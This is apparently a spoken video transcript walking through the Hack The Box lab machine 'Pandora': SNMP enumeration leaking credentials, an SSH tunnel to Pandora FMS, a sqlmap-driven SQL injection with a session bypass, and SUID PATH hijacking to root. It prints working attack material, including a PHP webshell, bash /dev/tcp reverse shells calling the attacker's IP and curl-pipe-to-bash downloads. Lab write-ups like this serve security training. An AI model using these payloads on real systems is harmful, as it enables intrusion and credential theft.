 what's going on YouTube this is IPS I can be doing Pandora from hack to box which is all about attacking Pandora FMS which is a monitoring application for networks and the cool thing about this is you don't know you're attacking Pandora FMS right away because nothing you have from your initial scans talks about that application you do have a web page that's just a standard one-page company page and if you did a UDP scan you can do a SNMP walk on the box which leads you to getting a list of running processes and the arguments and that contains username and password so you can log into the box and once you're in you can enumerate the Apache configuration to find out there's a second virtual host on it that if you use an SSH tunnel you can access and that virtual host is running Pandora FMS which use that SNMP to populate its own database there are a few exploits within Pandora so you get a shell as a different user and then there's a custom set uid binary that you can exploit with all that being said let's just jump in because there's a few fun tricks to do this box as always we begin with the end map so Dash SC for default scripts SV enumerate versions oh hey I'll put all formats playing the M map director and call it Pandora and then the IP address of 10 10 11.136 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on Port 22 and this Banner tells us it's an Ubuntu Server we also have HTTP on Port 80. asparent tells us it's Apache and it's also a Ubuntu Server there is a title it says play Landing so let's go take a look at what this page is so 10 10 11 136 and we just get a page we do have a hostname right now panda.htb so I'm going to add that into my host file so sudo VI Etsy host and then we can do 10 10 11 136 at panda.htb and then I always like just navigating there just seeing if it gives me a different page I don't have anything I'm looking at the links it looks like everything is just on one page so I'm going to scroll down to see if there's anything interesting on this page uh looking at these purchase links um it's just JavaScript void nothing's happening when I click them there is a fax doesn't really look like anything interesting there looks like just a standard one-page thing we do have two email support and contact and then also send a message so I'm going to try ipsack root at ipsec.rocks and then oh God that is a weird way to say a number um and I lost it let's just because I can't remember that I'm just going to inspect this element and then we will copy what it says for the placeholder there we go so what I did is I hit F12 and that brings up this little thing and I just clicked on this so we can navigate exactly where we want to um and then the message I'm going to do image source is equal to http 10 10 14 8 slash test and then we can do slash image and then we can also throw in a link to see if they're clicking links um 10 10 14 8. click me uh like this and then click May slash a so before we do that we should stand up a netcat listener on Port 80 which has to be done with sudo because it's a low number Port we send the message and we can see it sent it all in the get request to that and I'm not sure we'll get a hit but while we're waiting we can run like a go Buster so go Buster dir Dash U HTTP 1010 11.136 word list opseclist Discovery raft uh web content raft small words dot text then we should see if this is like a PHP server so I'm going to try index.php not found index.html looks like that's the extension I'm not going to bother brute forcing other HTML things and we'll just let that run and there's really not much we could do we can try like um a full port scan so pseudo and map Dash p dash 10 10 11 36 and I'm probably going to regret doing Min rate because we're already doing a lot of things saying the minimum rate to 10 000 packets per second we should also do Dash V for verbose and I'm not seeing error messages so that looks probably fine this should finish in like another two seconds there we go um because we're doing 10 000 packets per second there's only like 65 000 ports so around six to eight seconds should be enough to scan the whole thing and no extra ports um there is SNMP that we don't really scan that much but it's one of those things you should always do so we do Dash S capital u to scan UDP we also have the dash V flag and we can see it's increasing delay because we're probably putting too much on or a socket so we may want to kill this Min rate at 10 000. but let's just see if we get any hits back um it shouldn't take too much longer I would think I don't know exactly what an increase the interval to um well it gave up on a port and whenever I see that message I really don't like it but um let's just kill Min rate I'm gonna also kill Dash p dash we just really want to do the common UDP ports and when scanning UDP um it's a very finicky protocol you can see even like I don't have the mid rate and it's still increasing the scan delay because it's a connectionless protocol so just because I'm sending it a packet doesn't mean it has to respond to me I have to send it the correct packet so every time it goes to a port it's probably sending a few different hellos based upon its scanning engine in order to try to coerce it into sending a response back to us with TCB we don't really have to do that actually we don't have to finish the whole TCP handshake we send it a sin and if we get Ascent act back we know the port's open so that's why TCP scanning is so much easier and um sometimes I will just skip UDP scanning all together and just try the few UDP things I want to do like DNS SNMP um those types of things because we can see it is not cooperating so I'm gonna pause the video we're just going to see if it actually finds any ports it's been quite a while and we finally have it discovering Port 161 which is SNMP so you can see it's covered it around like 93 of the way done which is like infuriating because it just spent so long doing it however if we had just done like SNMP walk and then Dash C for Community the default Community string is public and then we always do version 2C because that's the default SNMP version on most things it should be version 3 but version 3 is a bit of a pain to install so you still see version 2C a lot it's also just a pain to use but um we just do this simple SNMP walk and we get a bunch of things however you're probably not going to get all this information because um of other boxes I have my SNMP configured a bit differently so first off um you want to install the package SNMP mibs downloader and once that's installed you want to go into um Etsy SNMP and then snmp.com and have this mibs line commented if you don't do those two things when you do this SNMP walk you just get all these numbers and these are just identification numbers which means certain things um so like now when we do it again we can see it's actually getting information now this is going to be a lot of information so what I'm going to use is actually I think it's SNMP bulk walk or let's see SNMP bulk walk yeah I'm going to use a tool called that because it like makes it a lot faster and this is the other piece we'll want to do is we also want to add a period at the end that gets a lot of people and I think we do Dash CR a thousand which I think makes it like do a thousand requests at once so I'm going to do SNMP walk.1 I'm gonna do it without the period and show there's different lines just do like um show that there's also a tool called like SNMP a new and that will probably make this a bit easier because it puts it a lot more human readable information however I don't really use that tool because if it has weird SNMP stuff SNMP or noobs not going to catch it when SNMP walk is so if I do wc-l on these two things we can see the first one when I added this period is around 2 000 lines larger so um obviously nice and if we list this file it's just got so much information so generally when I get something like this I tend to just like um filtering things out to identify what I want to look at so this information like we list this again we have this SNMP V2 MIB this is like the MIB that's installed in and this is the description like CIS or things like that so what I want to do is grab everything after the double colon up until probably the period uh probably period question mark and then I can pipe that over to sort and we can see all the unique Fields here so let's do um grep Dash o p because this is so overpowered I think this is like regular expression pulse syntax or something like that um I don't honestly know this is just how I do it and we're going to do double colon and then dot star question mark I don't know if we need the question mark Or Not um and then I'm going to escape a period and then do a double quote I'm going to do that on SNMP walk.1 and we see what it grabbed um I wonder if I have to Escape that no I don't want to escape that uh wait let's do this in single quotes there we go I don't know if that changed anything but so the next thing we're going to do is a sort and the reason why I do a sort is the next command unique Dash C is only going to work on items that are right next to each other so I think if like this family type was down here the unique Dash C wouldn't catch it because we got the storage type between it so that's why you do sort then unique Dash C so we can see all these items how often they are in and the next logical thing is to do a sort based upon numbers and we can see everything so module timeout module names uh what do we have a bunch of inet cider routes um that doesn't look right see maybe we don't want this double quote if we do this okay so the double quote was bad um what I was looking at if we did SMP walked up one um when I was creating that I was looking at something like this and I wanted to get like this period and then it's double crooked because I thought this when the data was going to be however if we went up here there is no double quotes here so that's why I got rid of that so we just terminate it on the period so what the script does looks for two colons grabs everything up until a period so now we can see things so if we look at like hrsw install so if I now grab this and we grep for that I'm just going to get rid of um the last thing because I want everything installed so we can do SNMP walk dot one last Dash capital s and we can see things so this is just looks like it's an index so it's counting things we get past index now we're getting to all the software names so this is looking like it's a list from like the package or apt just showing us all the installed pieces of software so we can get like the kernel version of everything from this um if we went down to install date we could see when those things were installed but I'm also interested in this SW run so I'm going to grab this and we're going to replace that grip with hrsw run and look through this so right here we have the Run name so this is going to be the binary name running and if you've ever ran a PS on Linux this looks like the output from that right we just don't have any arguments and that's probably because there is an SW run or this is the path so where it's running from but then we have the parameters so these are all the arguments that's running with it and right here we have something interesting we have this um sleep 30 and then bash C user bin host check Dash you Daniel and Dash p hotel babylon23 we also see the same thing here and if we wanted to we could see exactly what these are so if I um let's do I think the best way to show this on video we can probably grep hrsw run on SNMP walk dot one and then if we grep that for one one three four we can see the um run name is host check the Run path this is where it's located this is the parameters and I'm guessing probably this is the PID is one one three four if we do the other one let's see 851 we can see this one is sh and the parameters are this and I was trying to find out there's a way we can identify this is a child of this but I'm not positive um it's looking definitely like it is like this is a bash script that is then executing this but I think from this output we can't see that see if there's anything else here doesn't look like it so we should try these credentials right so SSH Daniel at 10 10 11 136 and log in with hotelbabylon23 and we get in so the other way to do it since I did mention SNMP enum let's see what this looks like so we do 10 10 11 136 the community is public and then we can find this config file with just a locate command locate SNMP unnum in order to specify it is linux.txt public linux.txt and we can see it running but again if that like what we want isn't in linux.text then SNMP enumes not going to tell us but we can see what it looks like like this uh very much the same thing if we look for was it Hotel oh Hotel did not show up app so it's not getting arguments actually so I must have done something wrong with this but um hopefully this kind of shows like my standpoint on like why I don't like some automated Recon tools because you it may just like Miss things right if we look at exactly how this is if we less it um yeah it's pretty much going straight to the oids with this um I think the oid for a argument is slightly different right so that's the downside with um automated Recon tools I guess when doing your own Recon yourself is easy enough and then as long as you know how to parse the information hopefully showing you the grip thing how I kind of approach it to see what type of information is there was beneficial so let's take a look at Daniel right so if we do lsoa we don't have a user.tax if we look at SSH there is an authorized key but it's completely blank so nothing really here there is a web server on this so we definitely want to see what that is and we have an HTML and Pandora which is odd if I look at index.html this looks like the exact page we have just because I see a bunch of references with play and I bet if we scroll down we'll see like a contact form which by the way um never contacted us back so that whole like clicking um Crossfade script test we did earlier I failed because I guess no one's watching the contact form but I want to take a look at Pandora um this looks different so if I go to Pandora console we have a log so then Pandora console .log and this is just PHP warnings if we look at we have a SQL database I guess a data database um the main thing I want to get is like credentials right so God mode this is probably a good directory to go in um that's probably like config and stuff so I'm going to do a find and grep4 config.pi and we don't have it generally in PHP Things Are um in the include directory that you want and let's see oh wait I did that pie um it's PHP right yeah that's what we want ah Less on include.php and we get a permission denied so only Mac can read this we do a ps-e-f and grep for Matt to see exactly um I thought we'd be able to see things that he's running or maybe not we have dub dub dub data let's see root so it doesn't look like Matt's running any processes but uh we want to probably escalate to Pandora right so let's take a look how we access this so if we go Etsy Apache 2 sites enabled and then we have pandora.com and if I look at it we have a virtual host listening on 12700-180 and the server name is pandora.panda.htb so I'm going to try accessing this so if I do sudo VI Etsy host and we add this I don't think it's going to let us in because it's not listening on zero zero zero eighty it's only on localhost but it's worth a shot right and going here we get this store so that doesn't help us however um if uh squiggly C is the first line on your SSH prompt you go into this menu where you can specify other arguments I'm going to do Dash capital L for a local port forward I'm going to specify Port 8000 on my Local Host so if I do SS lntp grep 8000 we see I'm not listening there it's going to now listen once I run this command and everything that I um send a port 8000 my Local Host I want to send it to 127001 Port 80. and then we run this and now if I run this thing we are now listening on Port 8000 it is SSH and if I grab localhost 8000 it directs me all the way through that SSH tunnel and we get to um Pandora FMS which based upon this looks like some type of um monitoring software right which makes sense because the initial foothold was based upon SNMP so there's probably queries SNMP data to uh give information right so we do have a version here so we have version 7.0 uh seven four two fix Pearl and it also gives us the year 2020. I'm going to do a search point on Pandora and I'm going to grep for seven because I care about seven this is authenticated cross 8 scripting authenticated net tools rce I wonder if that is authenticated this is authenticated cross-site scripting cross-site scripting um let's do a search sport Dash X and if we go here it is authenticated so um we can try like brute forcing our way in with like admin admin looking for default credentials but sometimes search plate or exploitdb isn't like doesn't have everything so I'm going to do Pandora FMS exploit on authenticated and add 7.0 in my search and we'll see what we have so uh 742 critical code one abilities explained so it looks like we do have a pre-authentication SQL injection which is cve 2021-32099 so if we take a look at this it goes to include chart generator and if we read this whole thing um I think we know like session ID is a vulnerable parameter of this right let's see ID session let's do session ID so what it's doing here is getting a new user and grabbing the PHP session ID for anything with this session ID thing here and what it's going through is how this code works and where's the SQL injection eventually a code hits right here which is not a um I think a paired statement is the terminology you want to use but this is just a vulnerable statement so if we create a URL let's see it was not cve whatever um we want to go to include chart generator dot PHP and then session underscore ID is equal to something and this is where the SQL injection is so we do session ID is one or one equals one let's see what happens here access is not granted um let's see if we put a double quote let's do a single quote um it doesn't say access not granted and the title did change at least I believe it changed yeah access denied was the title and when we do this we have it blank so now if I go back here we are not logged in but we have confirmed there's probably some type of SQL injection we just did something really weird with that um let's see I want to go to storage let's delete my cookies refresh this cookie has been generated refresh this page and nothing so what I'm going to do is send this over to SQL map and we have to start up well we should stood up burp we could do it based upon the URL parameter but I always like doing SQL map by copying a request because this way it sets a lot of default things that you may want such as like a PHP session or um the user agent things like that so that's why I always like doing it in this way so session ID now we have this I'm not going to do I don't think I want PHP session just in case that's like a session for an unauthenticated user I don't want to check SQL map so we have everything here I'm just going to put a 1 there and then we can copy to file and then put this in htb search and then I'll do Pandora dot request so here we can do a SQL map specify the request do you have a Pandora directory I do I wonder when I created that it's empty weird um and then we can do dash dash batch and this will validate it is injectable um what let's see where is copy to file I screwed something up I think search let's see oh search was the last video I did the video is Pandora um so now we want to do um pandora.request there we go so running this is going to eventually find a SQL injection so I'm gonna pause the video and let this run and there we have it um we can see it found a union SQL injection and I'm gonna do dash dash tables just dump all the tables here um I probably should have specified the database as well because it's dumping information schema but if we do the dash dash dump command it's going to take a very long time so that's why I wanted to just dump the tables but I may want to specify database as well I don't know exactly how to do that so SQL map Dash H grep let's just list this and I think it's probably going to be by the tables right tables Dash D so I wonder if we can do dash dash databases dash dash DB DBS there we go so we can do what was it Dash D probably D Pandora dash dash tables that did not work uh database Dash capital D there we go so now we're only dumping the tables we want it looks like every table begins with the letter T and then has something and you can see there's a lot of tables here so this is why the dump command takes a long time and of course it's also harvesting SNMP information we saw how much was in that SNMP walk so if we just dumped this um it'll be a very long time so what I'm going to do next is specify the T what is it think session so the T sessions table and dump just this one table see unable to retrieve column name for T sessions oh it's not t sessions it's t uh session 1s so let's just copy this so add this dash dash dump and there we go now it's dumping it and once this finishes dumping we can start playing with this and since we want to do everything in the whole database let's start something in the background so time so we can see how long this actually takes SQL map Dash r pandora.request dash dash dump uh Dash capital D for database we want Pandora and dash dash batch and we can run this with 10 threads so it'll go as fast as possible 10 is the max you can do a SQL map so we'll see how long that command takes we can see login field here for this T session you know and this is not what I wanted actually um I don't think I don't see session information what other tables do we have tables so let's see Network policy user maybe it's this one see what's in this hopefully running two escrow Maps isn't going to be bad what language is this let's go translate.google.com turn my burp Suite off and then I'm going to paste I don't know did not mean to click that paste this username this is Spanish so it looks like it's attempting to crack things as well so we have hashes so we could potentially crack all these passwords this database seems to be pretty big if you want a good way to print this we can just go to the SQL map history so if we do uh dots um is it local share SQL map then output localhost and it's localhost because we're pivoting through local hoses normally whatever the URL is and then dump Pandora and we have all the tables that we have done we can do this table if I do a dash capital S to break line breaks maybe it's a little bit more manageable but we could auck things right so if we had dash one this file [Music] um we could say one two three four six seven we could try like awk Dash f print seven like this to do it that's disabled um Let's see we want one two three away from that so four email and we can do let's try 10. last name is to do 11. we got email password we can get rid of the head turn that into a cat and get things like that if we wanted to um it's all that Matt is in here twice but let's take a look back at the tables so tables and see what we have so let's see is there a different table oh um sessions underscore PHP I must miss the underscore PHP last time so if we um dump the T sessions PHP table C we have quite a few sessions so what I'm going to try doing is just taking one of these so let's copy this and paste it in with a session ID is okay then we can try refreshing this and nothing happens um let's change a PHP session ID to be what's in the database and then refresh this nothing happens so I wanted this session is dead let's see we can take one with this this has other information like this whole new Chat thing so I can grab that let's delete our PHP session paste this it's not saying access denied which seems to be good refresh it and we get logged in as matte however um I don't believe Matt is an admin I don't see a lot of like administrative functionality here so I'm going to log out of this and we're going to try some other things and at the end of the video we'll exploit it with Matt as well but when I was going through this box the first time what I ended up doing because I never actually got this to work where I gave it a session it logged me in um it would always do what it did with Daniel so I must have just magically picked one of the valid sessions um like whoops if we copy this let's see if this works because it was not working for me before um we wanted to delete then paste and refresh so I always had trouble getting this to work so what I had found out with this app is if we go to a union injection so Union select uh one we have an error it's selecting from T sessions PHP if we look at here there's three different entries here so if we did one two three now we get access not granted because we didn't pass it a valid session if we put a session here let's see what happens let's take this one that worked right um if I put this in here we still get access not granted because it's not expecting to get this information expecting to get this so what I had done is I realized the difference between Daniel and Matt this is S4 and Matt is four characters this says S6 Daniel is six characters so I'm going to copy Daniels and in our um injection I'm going to do a single quote paste this in and then another single quote and we're going to change Daniel to be admin and put this to be five characters long and now we have a SQL error so let's see what did we screw up one Union select one two five I wonder if it doesn't like this semicolon oh um we just have dash dash we need Dash Dash and then a space and a character and there we go we have been granted access and when we refresh this now we have a lot more options on this left-hand pane so we see admin tools admin tools looks juicy if we go to file manager we are in index of images so if we do Pandora console slash let's just do a new pane localhost 8000 Pandora console slash images we can see all the images on the server so I'm going to try to upload something so I'm going to upload file and we want to create a reverse shell so I'm going to do V shell.php well it's not going to be a reverse shell it's just going to be something that executes PHP code so system request we'll call it CMD like that that looks fine if I upload let's go to hdb Pandora cell.php upload this it uploaded successfully if I look back at the images we can see shell.php exist if I click on it we don't get any output but if I do question mark CMD equals who am I we have Matt so we can put a shell here so let's just send this over to burp sweet turn intercept off like that and then what we want to do is convert this to a post request and we can just do a normal bash cell so bash Dash C bash Dash I Dev TCP 10 10 14 8 9001 zero and one like that control U and see lvnp 9001 send this and we get a reverse shell so now we're the matte user I'm going to do python3 Dash C import PTY pty.spawn Ben Bash and then sdty raw minus Echo FG hit enter twice now we have proper shell if I go in mats we have user.txt and there's not much else so what I'm going to do is download lint piece and we're going to run it to see if there's any easy prevasks and we can see that nmap took 23 minutes to run so to dump everything it was 23 minutes which is quite a bit that's why I specified specific tables okay so when Pandora dub dub dub let's do GitHub Lin Peas Turn burp sweet off go here uh we probably wanted piece Ng release and we want to download this so if I just copy this link we can W get it and then let's start a web server so python3-am HTTP server I'm going to say 8001 because my SSH tunnel is going through port 8000. and we can curl 10 10 14 8. 8001 limpees.sh type it over to bash uh we probably need http uh what oh I have an extra o in my port and that did not download Lin piece I hate downloading things from GitHub sometimes let's just download it this way move downloads lintps.sh and run this after we start a web server back up wait what leslimpies.sh I had a typo there we go so now that Lin piece is running and we wasted a minute and a half let's just let this get to the end and then we'll go over it and find what's here okay Lin p is finished so let's just go to the top I'm going to search basic information because that's the very first thing Lin piece says and let's see it's telling us the um you name output and we have this kernel was compiled November 5th of 2021 so relatively old kernel we do have ping NC and nmap on this box and um I have to go check this is nmap actually on the box to do which end map it looks like it is so that is a weird one um maybe add Maps has set uid binary and that would be the pro best but that seems a bit lame so let's take a look at what we have uh Ubuntu pseudo version we have some cves I want to say 40 34 is pound kit I've seen that one enough so let's do just a search on it and see what it is yes this is pound cat and um it's January 25th 2022 is when this came out so there are two things we can do to check this because penkit depends on I want to say PK exec so I'm just going to do a witch on PK exec see if it's here it is so we do lsla on it and we see it is a set uid binary and it's from 2021 so chances are this thing is vulnerable um I look at the date a lot on this because when PK exec was updated it has a version string but it didn't update the um wait BK exec that's h oh it's dash dash version okay but it didn't actually update this so it becomes pretty hard to check for a vulnerable version but let's go back to this so basic information uh we have this cve I don't know what this one is there's so many cves uh this looks like a policy kit prevask so something else related to policy kit going down let's just see what else there is um Linux exploit suggestions does say pound kit we have Sam edit as well see I guess this was I wonder how it detected this one because we have Sam edit because I don't think this screen is vulnerable it says exposure less probable so maybe not um a few things there processes we don't really care about we already kind of know what's on there because we looked at it before system timers socket files I'm just looking for like red highlighted in yellow right now or just sections that I um recognize we could check groups to see if we're a member of the lxd group but I think that would be displayed before usual software installed compilers MySQL Maria DB files we've already looked at the database so that's not too interesting see what else is there no gpg keys found Docker files bind files interesting file so what set you ID now so we can see I get of course PK exec is there and we could have just searched the output for that because it did lsla for us but the one thing that is really interesting is this user bin Pandora backup it's also flagging it as unknown suid binary so I really like this because it makes it really obvious um like when things stick out and we do have Matt being a member of the group and he can read and execute this file so I'm just going to skip the rest of this and we can take a look at it and then at the end of the video we can try like uh parent kit to see if that works as well as some other things so let's take a look at this file we do a file against it it is just a normal set uid elf so I'm going to run strings to see what it is and strings can't be found so um let's copy this over to our box we have netcat so I'm just going to netcat this over so netcat 10 10 14 8 uh we'll listen on point 9002 and then send this file and then we can go here and do nclvnp 9002 and send this out to um was it Pandora backup okay hit enter and then it's not going to terminate this connection so I'm just going to assume it's completed and Ctrl C it and if we run file on Pandora backup we have it we can md5 Summit as well 172 it ends in of we can md5 some here 172 ends in of so we have got the file so at this point we may just want to execute it to see what happens so when I run it we have a tar error saying permission denied it can't do something so I'm going to take a look at this so we can just run strings against it and if we look for tar because we know it's doing Tara we can see the actual exploit right now um it's running Tara but it's not doing a full path so it's vulnerable to path injection um so we can actually just open this up in gija because it may be more apparent what's happening if I do this um you don't need to you can kind of just spot these vulnerabilities we could also run it with like f trace and see the system call that is happening um I'm sure if you search ipsec.rocks for path injection there'll be plenty of them because it is a common vulnerability so I'm just going to hit I to open oh we can change the directory let's go up one and the box is Pandora and we probably copied it the www we did okay is now importing the file analyze it yes and that analyzed extremely fast so this is probably going to be pretty small I'm just going to go to the main function so I want to exports Main and we can see main it's going to do a get you ID then set real user ID and then we can see this system call so it's running system tar so because it's not a full path it's depending on the path to do this so the path is let's see if we Echo path it's this so whenever you try to find a file it's going to go from left to right of this path to find out um like where the file is and if you look at sudo if we do pseudo that's weird I wonder why we got that I do Cedar Dash L here we can see it does things like environment reset and so your cure path in sudo so you can't do path hijacks in sudo but um that is weird that we can't do a set real user ID okay um I wonder if that's going to cause issues here so let's do Echo bin bash and call it tar so now if I run Tara we still have it must specify one of these options right but if I um export my path and put my current working directory which is home map we can just actually say it so home Matt that's where I am and then path and I do Echo path again we can see how Matt is here if I ran which tar um let's see CH mod plus X tar the file we created so remember my cat this this is Ben Bash so now you're on Wichita we see it is pulling it from home matte so now if I run this user bin Pandora backup it should have put us as root but it did not and I think that's because of that error we saw before it couldn't set real user ID because we see the program doing this call and when we do sudo we actually get an error message so Sudo is coded a bit better to say hey if there's an error actually say it um I'm not sure why this is the case I wonder if like Mount grep r-e-s-u-i-d or seoid there's a lot of no sewards here let's see I wonder if we agree got a shell one of my Shell's parent process is in a directory that has um no Seward I don't really see let's see temp FS I don't think I'm there I'm definitely not in proc um let's do this is a bash variable get pib so fast variable current process PID let's see PID from a shell script dollar dollar so if I do Echo dollar dollar PS Dash EF dash dash Forest less going to copy this uh let's just do a ps-e-f okay okay so this is me this is my parent this is this this is this guy's parent and then 700 where is this so up here 99 okay okay and now we're in Apaches process and then we look at this guy's parent www data 854. that is going to be root out of Apache and then one I don't see me going into any weird directories um I'm not sure why that's failing if I cat Etsy Apache 2 um let's see sites enabled Pandora I wonder if this assigned user ID actually is breaking my set user ID calls it's very possible that's the case um I don't have my Daniel shell anymore but Daniel I don't think he could execute this file um which Pandora backup yeah Daniel can act um execute this so we have to escape out of Apache so I'm just going to make the.ssh and we can create a key so I'm just going to sh Keygen Dash F matte okay strip this web server back up oh I do have a show on Daniel still but um I don't think I can execute that file so it doesn't matter so let's W get 10 10 14 8 8001 Matt dot Pub we have downloaded his public key we want to move it to authorized keys and then SSH will um chmod 600 I don't think you have to do this when schk Keygen makes the private key file but it's just my Habit to always do it 10 10 11 136 see if I get in if I do a pseudo-l now it's not giving me that can't set password thing so this is looking better if we export um path is equal to my working directory then the path and now user bin um what is it Pandora backup we can see my user ID is root and we can go to root do get that so um that is pretty much gonna be the box I did want to try out pound kit real quick so let's just Google we can search pound kit exploit and we already looked at that let's see self-contained I know there's a pound kit exploit I like because the issue I have with a lot of these is they're all confusing because they have like GCC calls inside of a c program which I find redonkulous um maybe this one doesn't let's just call this and see what this does um go back here get clone I think they already had a compiled version for me too which is nice okay stand up the web server again and then we can just W get 10 10 14 8 8001 pound kit CH mod plus X and it did not work however we had that whole set uid issue so let's go back to our SSH window we are matte by execute phone kit here it switches us to root so that is definitely going to be the issue the next thing I wanted to show is the other way to um get a shell on this box because believe it or not when we did let's see this thing and put this whole Union thing in this was unintended we weren't supposed to be able to get to the admin user so let's log out of him I think I'm already maybe logged out yep and we're going to do it with the low priv user so hopefully we can get this working again um like I said before I found out the unintended way because I had trouble doing it the intended way which is sometimes how these unattended things do happen but let's do local um share then SQL map output localhost dump Pandora and I want to get t then that sessions php.csv and I think it was this one we had grabbed I remember it was Matt and it had some like things after it so if I grab this ID and we paste it in here and then refresh this page do we login awesome so it's all about I think finding the right ID here and maybe it's matte with the chat and b z or whatever at the end but now we're logged in and you notice we don't have the admin tools because we're not an admin user if we looked for more vulnerabilities within the software um this is like just plunded with vulnerabilities but there is some more another page on this core security thing if you go down it talks about um this ajax.php thing and we can just do and Target and put a shell there so what I'm going to do is open up burp Suite we're going to see if it does this Ajax call to us and if it does then we will um edit the target so page god mode setup set notifications check new is this what it looks like on the post no it's Ajax events but maybe we can just copy and paste this because we're on the right eight um thing of this ajax.php so Target bash Dash I and then we can say 10 10 14 8 9001 I'm going to put this over to repeater and we also probably should be listening right so in bip Suite send it error executing response and we did not get a shell which is unfortunate I wonder if we didn't encode it right let's see that is right one of this one is it's a post so what I'm going to do is just type it out how I normally do so dash dash i Dev TCP 10 10 14 8 90001 zero and one and then we highlight everything control U send it and we do have error executing response so I wonder if I do who am I we do have at running that um so we know we have code execution here right the issue was probably a bad character that is definitely listening um we can try encoding this so let's do Echo dash n um we can say bash Dash I Dev TCP 10 10 14 8 900010 and one so if we paste this in it's not going to work right just to make sure we didn't have a typo before uh we definitely have to URL and code that because it has an and so that doesn't work we can base64 w0 and oh I wonder if we have to let's see bash plus Dash C plus say Dash C plus and then put this in single quotes is that going to work hey that did work so um this target just was not in bash first there was probably like a dash shell and that's what it was using and the shell it was using didn't have this whole Dev TCP thing so um that was the issue what I was going to do is uh let's see I think I put it can't find the page.php I don't know what I just screwed up I probably yeah mess up the very first variable but um if we do let's see LS what is it I'm gonna just do which Dash so if I do NC lvnp 8001 Echo one two Dev TCP 10 10 14 8 8001 we can see I sent one so if I do Dash so I change my shell to the dash shell and then I do the same exact command it fails because this directory does not exist like I said this whole Dev TCP thing is a bashism so that's probably why it was failing before um but I think that tangent I didn't mean to go on because I was trying to do the shell this way and this also probably would have led me to success because of how I execute this so NC lvnp 9001 so if we get out of this target we can just do a Echo dash n paste this and then pipe it over to base64-d and then Bash so in this we're actually typing bash so we encode it correctly as well I don't think this is going to work oh no it did you all encode the plus so we'll see if this show works um I did it again somehow I broke up Paige but um if I went down my normal troubleshooting of my reverse shell not working and then converting it to base64 I would have eventually led to a success but it would have been a success the wrong way because I didn't understand what was happening and what was happening was I was just in the wrong shell so with that being said that's gonna be the video hope you guys enjoyed it take care and I will see you all next time